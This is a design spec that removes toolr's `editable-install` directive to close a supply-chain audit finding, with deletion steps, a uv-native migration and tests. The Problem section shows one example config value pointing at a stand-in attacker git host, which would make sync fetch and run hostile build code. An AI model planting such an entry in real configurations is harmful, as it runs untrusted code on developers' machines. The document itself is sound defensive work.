# Remove `editable-install`: rely on uv-native `[tool.uv.sources]`

**Date:** 2026-06-10
**Status:** Proposed (brainstorming approved)
**Depends on:** `specs/2026-06-10-static-only-manifest-design.md` (SEC-01) and
`specs/2026-06-10-runner-path-hygiene-design.md` (SEC-02). Stacked on `runner-path-hygiene`; SEC-01 reshaped
`project.rs` (added `finalize_sync`), which this branch edits.
**Closes:** audit finding SEC-04.

## Problem

`[tool.toolr] editable-install` (`crates/toolr-core/src/venv/config.rs:46-48`) is a list of specs that toolr
installs, post-`uv sync`, by running `uv pip install -e <spec>` one entry at a time
(`crates/toolr-core/src/venv/editable.rs:21-59`, called from `project.rs:66`). Non-`.` specs are forwarded
verbatim, so a repo can ship `editable-install = ["git+https://attacker/x"]` and `toolr project venv sync`
will build/install attacker code (its build hooks run).

## Why remove rather than validate

The directive is **redundant** with uv's native editable support and strictly worse:

- `uv sync --project tools` (`sync.rs:94`) already installs everything declared in `tools/pyproject.toml` +
  `uv.lock`, **including editable path deps** declared via `[tool.uv.sources] foo = { path = "...", editable
  = true }`. uv resolves and installs those itself, and they are recorded in the lockfile.
- toolr's own `tools/pyproject.toml` uses exactly that uv-native form (commented) for the editable `toolr-py`
  case — it does **not** use `editable-install`. The only references to the directive are its own code, its
  tests, and `docs/project-config.md`.
- `editable-install` is **unlocked** (escapes `uv.lock`) and is a **second, bespoke code-execution channel**
  toolr must otherwise police.

Removing it deletes the bespoke unlocked vector instead of guarding it. A remote editable then has to be
expressed as a `[tool.uv.sources]` dependency, which `uv sync` installs like any other dependency — the
**same inherent trust** as any pinned dependency (installing deps runs build hooks; true of `pip install -r`,
`npm install`, everything), which the user already consents to by running `venv sync`, and which `uv.lock`
makes pinned and reviewable. So removal **does not widen** the attack surface; it narrows it.

No escape hatch is provided, and none would be trustworthy: a repo can inject env vars via its own
`mise.toml [env]`, and a config key is repo-controlled by definition — so the only sound control is the
absence of a toolr-side install-`-e` channel.

## Design

Delete the `editable-install` mechanism end to end:

- Delete `crates/toolr-core/src/venv/editable.rs` (module + `perform_editable_installs` / `EditableOutcome` /
  `warn_failures` + its tests).
- `crates/toolr-core/src/venv/mod.rs`: drop `pub mod editable;` and the re-export
  (`EditableOutcome, perform_editable_installs, warn_failures`).
- `crates/toolr-core/src/venv/config.rs`: remove the `editable_install` field from `ToolrConfig`, and update
  the two tests that assert on it.
- `crates/toolr-core/src/project.rs`: remove the `perform_editable_installs(...)` + `warn_failures(...)` block
  (lines ~66-72) and the two names from the `use` at lines 13-14. `finalize_sync` (provenance + manifest
  rebuild) stays.
- `docs/project-config.md`: delete the `editable-install` section (and the "Apply each entry…" step) and
  point readers at `[tool.uv.sources]` editable path deps as the supported way.
- `UNRELEASED.md`: a Removed note with the migration.

**Graceful for existing configs.** `ToolrConfig` does not set `#[serde(deny_unknown_fields)]`, so a
`tools/pyproject.toml` that still carries `editable-install = [...]` continues to **parse without error** —
the key is simply ignored (the directive becomes a no-op). No hard break at load time; the behaviour change
is that the listed specs are no longer installed.

## Migration

`[tool.toolr] editable-install = ["./packages/foo"]` becomes a standard editable path dependency in
`tools/pyproject.toml`:

```toml
[project]
dependencies = ["foo"]

[tool.uv.sources]
foo = { path = "./packages/foo", editable = true }
```

The repo's own `tools/pyproject.toml` already documents this pattern for `toolr-py`.

## Error handling

None added — this is a deletion. `uv sync` failures are handled as before.

## Testing

- **Build/lint:** `cargo build --workspace` and `cargo clippy` clean after the deletions.
- **Config still parses with the legacy key:** a `tools/pyproject.toml` containing `editable-install = ["."]`
  loads into `ToolrConfig` without error (key ignored). Add/adjust a `config.rs` test asserting this.
- **No install-`-e` path remains:** `grep -rn 'perform_editable_installs\|pip.*install.*-e\|editable_install'
  crates/` returns nothing outside historical CHANGELOG/spec text.
- **Suite:** `mise run test` green (the deleted `editable.rs` tests go with the module; `project.rs`/`config.rs`
  tests updated).

## Out of scope

- The inherent "`uv sync` installs whatever `pyproject`/`uv.lock` pin, running build hooks" trust. That is the
  same consented dependency-install model as `pip`/`npm`; document it as a known property rather than trying
  to sandbox dependency installation. A remote editable expressed via `[tool.uv.sources]` falls under this.
